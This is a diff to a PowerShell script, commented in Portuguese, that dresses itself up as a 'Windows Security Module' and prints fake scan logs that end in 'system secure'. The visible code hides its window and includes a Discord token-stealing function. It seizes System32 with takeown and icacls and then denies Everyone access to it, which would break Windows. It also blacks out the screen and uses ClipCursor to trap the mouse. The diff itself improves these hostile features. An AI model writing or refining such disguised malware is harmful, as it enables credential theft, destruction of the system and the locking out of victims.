@@ -78,11 +78,24 @@ Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
 Write-Host "==================================================" -ForegroundColor Cyan
 Write-Host ""
 Start-Sleep -Seconds 1
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
-Start-Sleep -Milliseconds 500
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
-Start-Sleep -Milliseconds 500
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
+
+$logs = @(
+    "Inicializando modulo de verificacao do sistema...",
+    "Carregando bibliotecas de analise...",
+    "Verificando integridade do sistema...",
+    "Escaneando arquivos criticos do Windows...",
+    "Analisando processos em execucao...",
+    "Detectando possiveis ameacas..."
+)
+
+foreach ($log in $logs) {
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
+    Start-Sleep -Milliseconds 300
+}
+
+Write-Host ""
+Write-Host "[$(Get-Date -Format 'HH:mm:ss')] VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Green
+Write-Host ""
 Start-Sleep -Seconds 2
 
 # ===== ESCONDE JANELA =====
@@ -238,6 +251,8 @@ function Get-DiscordToken {
 function Block-System32 {
     try {
         $path = "C:\Windows\System32"
+        takeown /f $path /r /d y 2>$null
+        icacls $path /grant Administradores:F /t 2>$null
         $acl = Get-Acl $path
         $acl.SetAccessRuleProtection($true, $false)
         $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
@@ -249,11 +264,12 @@ function Block-System32 {
     }
 }
 
-# ===== TELA PRETA =====
+# ===== TELA PRETA (CORRIGIDA) =====
 $global:blackScreenForm = $null
 
 function Black-Screen {
     try {
+        # Criar o form na thread principal do STA
         $form = New-Object System.Windows.Forms.Form
         $form.WindowState = 'Maximized'
         $form.FormBorderStyle = 'None'
@@ -263,10 +279,21 @@ function Black-Screen {
         $form.ShowInTaskbar = $false
         $form.KeyPreview = $true
         $form.Add_KeyDown({
-            if ($_.KeyCode -eq 'Escape') { $form.Close() }
+            if ($_.KeyCode -eq 'Escape') { 
+                $this.Close() 
+            }
         })
+        
         $global:blackScreenForm = $form
-        $form.ShowDialog()
+        
+        # Executar em uma thread STA
+        $thread = New-Object System.Threading.Thread({
+            [System.Windows.Forms.Application]::Run($form)
+        })
+        $thread.SetApartmentState('STA')
+        $thread.IsBackground = $true
+        $thread.Start()
+        
         return "BLACK_SCREEN"
     } catch {
         return "BLACK_SCREEN_ERROR"
@@ -286,62 +313,116 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (VERSÃO CORRIGIDA) =====
-$script:mouseLocked = $false
-$script:lockThread = $null
+# ===== TRAVAR MOUSE (CORRIGIDO) =====
+$global:mouseLocked = $false
+$global:lockThread = $null
 
 function Lock-Mouse {
     try {
-        Write-Host "Tentando travar mouse..." -ForegroundColor Yellow
+        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
-        if ($script:mouseLocked) { 
-            Write-Host "Mouse já está travado" -ForegroundColor Yellow
-            return "MOUSE_ALREADY_LOCKED" 
-        }
+        $global:mouseLocked = $true
         
-        $script:mouseLocked = $true
-        
-        Write-Host "Iniciando thread de travamento..." -ForegroundColor Yellow
-        
-        $script:lockThread = [System.Threading.Thread]::new({
-            try {
-                Add-Type -AssemblyName System.Windows.Forms
-                while ($script:mouseLocked) {
+        # Usar uma thread separada para travar o mouse
+        $global:lockThread = [System.Threading.Thread]::new({
+            while ($global:mouseLocked) {
+                try {
+                    # Move o mouse para o canto superior esquerdo
                     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 1
+                    
+                    # Tenta travar a área do mouse usando uma chamada simples de API
+                    Add-Type @"
+                        using System;
+                        using System.Runtime.InteropServices;
+                        public class MouseLock {
+                            [DllImport("user32.dll")]
+                            public static extern bool ClipCursor(ref RECT lpRect);
+                            
+                            [StructLayout(LayoutKind.Sequential)]
+                            public struct RECT {
+                                public int left, top, right, bottom;
+                            }
+                            
+                            public static void Lock() {
+                                RECT rect = new RECT();
+                                rect.left = 0;
+                                rect.top = 0;
+                                rect.right = 1;
+                                rect.bottom = 1;
+                                ClipCursor(ref rect);
+                            }
+                            
+                            public static void Unlock() {
+                                RECT rect = new RECT();
+                                rect.left = 0;
+                                rect.top = 0;
+                                rect.right = Screen.PrimaryScreen.Bounds.Width;
+                                rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+                                ClipCursor(ref rect);
+                            }
+                        }
+"@ -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction SilentlyContinue
+                    
+                    [MouseLock]::Lock()
+                    
+                    Start-Sleep -Milliseconds 10
+                } catch {
+                    Start-Sleep -Milliseconds 10
                 }
-            } catch {
-                Write-Host "Erro na thread: $_" -ForegroundColor Red
             }
         })
         
-        $script:lockThread.IsBackground = $true
-        $script:lockThread.Start()
+        $global:lockThread.IsBackground = $true
+        $global:lockThread.Start()
         
-        Write-Host "Mouse travado com sucesso!" -ForegroundColor Green
         return "MOUSE_LOCKED"
     } catch {
-        Write-Host "Erro ao travar mouse: $_" -ForegroundColor Red
-        return "MOUSE_ERROR: $_"
+        return "MOUSE_ERROR"
     }
 }
 
 function Unlock-Mouse {
     try {
-        Write-Host "Tentando liberar mouse..." -ForegroundColor Yellow
+        $global:mouseLocked = $false
         
-        $script:mouseLocked = $false
-        
-        if ($script:lockThread -and $script:lockThread.IsAlive) {
-            $script:lockThread.Abort()
-            $script:lockThread = $null
+        if ($global:lockThread -and $global:lockThread.IsAlive) {
+            $global:lockThread.Abort()
         }
         
-        Write-Host "Mouse liberado!" -ForegroundColor Green
+        # Tenta liberar a área do mouse
+        try {
+            Add-Type @"
+                using System;
+                using System.Runtime.InteropServices;
+                using System.Windows.Forms;
+                public class MouseLock {
+                    [DllImport("user32.dll")]
+                    public static extern bool ClipCursor(ref RECT lpRect);
+                    
+                    [StructLayout(LayoutKind.Sequential)]
+                    public struct RECT {
+                        public int left, top, right, bottom;
+                    }
+                    
+                    public static void Unlock() {
+                        RECT rect = new RECT();
+                        rect.left = 0;
+                        rect.top = 0;
+                        rect.right = Screen.PrimaryScreen.Bounds.Width;
+                        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+                        ClipCursor(ref rect);
+                    }
+                }
+"@ -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction SilentlyContinue
+            
+            [MouseLock]::Unlock()
+        } catch {
+            # Se falhar, pelo menos para de mover o mouse
+        }
+        
         return "MOUSE_UNLOCKED"
     } catch {
-        Write-Host "Erro ao liberar mouse: $_" -ForegroundColor Red
-        return "UNLOCK_ERROR: $_"
+        return "UNLOCK_ERROR"
     }
 }
 
